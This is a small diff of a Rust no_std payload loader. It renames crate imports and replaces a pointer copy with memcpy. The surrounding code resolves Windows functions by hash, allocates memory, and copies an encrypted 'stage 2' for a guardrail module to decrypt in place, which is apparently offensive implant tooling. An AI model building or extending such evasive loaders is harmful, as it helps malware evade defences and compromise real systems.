@@ -4,9 +4,9 @@
 #[panic_handler]
 fn panic(_info: &core::panic::PanicInfo) -> ! { loop {} }
 
-use core::{ffi, mem, ptr::{self, null_mut}, slice::from_raw_parts_mut};
-use crystal_palace_rs::{append_data, get_resource, import};
-use crystal_palace_sys::tcg::{PicoCodeSize, PicoDataSize, PicoEntryPoint, PicoLoad, findFunctionByHash, findModuleByHash};
+use core::{ffi, mem, ptr::{null_mut}, slice::from_raw_parts_mut};
+use crystal_sdk::{append_data, get_resource, import, mem::memcpy};
+use crystal_bindings::tcg::{PicoCodeSize, PicoDataSize, PicoEntryPoint, PicoLoad, findFunctionByHash, findModuleByHash};
 use winapi::{shared::{basetsd::SIZE_T, minwindef::{DWORD, FARPROC, HMODULE, LPVOID}, ntdef::LPCSTR}, um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE, PAGE_READWRITE}};
 
 #[unsafe(no_mangle)]
@@ -124,7 +124,7 @@ extern "C" fn go() {
         buffer = from_raw_parts_mut((funcs.VirtualAlloc)(null_mut(), stage2.len(), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE) as *mut u8, stage2.len());
 
         /* copy our (encrypted) stage 2 over to our RW working buffer, our guardrail PICO decrypts in place */
-        ptr::copy_nonoverlapping(stage2.as_ptr(), buffer.as_mut_ptr(), stage2.len());
+        memcpy(buffer.as_mut_ptr(), stage2.as_ptr(), stage2.len());
 
         /* run our guardrail COFF to handle *everything* about the guardrail process. Note that the return
          * value of this function is a SLICE into the buffer we passed in. It's not a new allocation. */
